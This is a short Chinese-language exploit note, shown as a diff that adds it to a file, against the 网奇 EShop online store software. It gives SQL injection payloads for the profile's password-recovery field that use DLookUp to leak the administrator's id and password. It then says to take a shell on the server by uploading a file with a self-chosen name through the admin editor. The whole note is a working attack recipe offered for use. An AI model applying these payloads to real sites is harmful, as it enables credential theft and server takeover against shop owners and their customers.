@@ -1,0 +1,14 @@
+////////////
+网奇EShop网上商城系统,注射漏洞 直接获取管理员帐号密码
+
+先注册一个用户
+登录   ---- 修改资料---密码找回填写
+l', Name = Cstr(DLookUp('memberid', 'admin')) + '
+保存修改  爆管理员id  一般是1
+之后继续 修改-- 密码找回  填写
+l', Name = Cstr(DLookUp('Password', 'member', 'memberid=1')) + '
+就会爆出帐号密码
+后台拿shell
+编辑器上传  可以自命名 
+ 
+/////////////
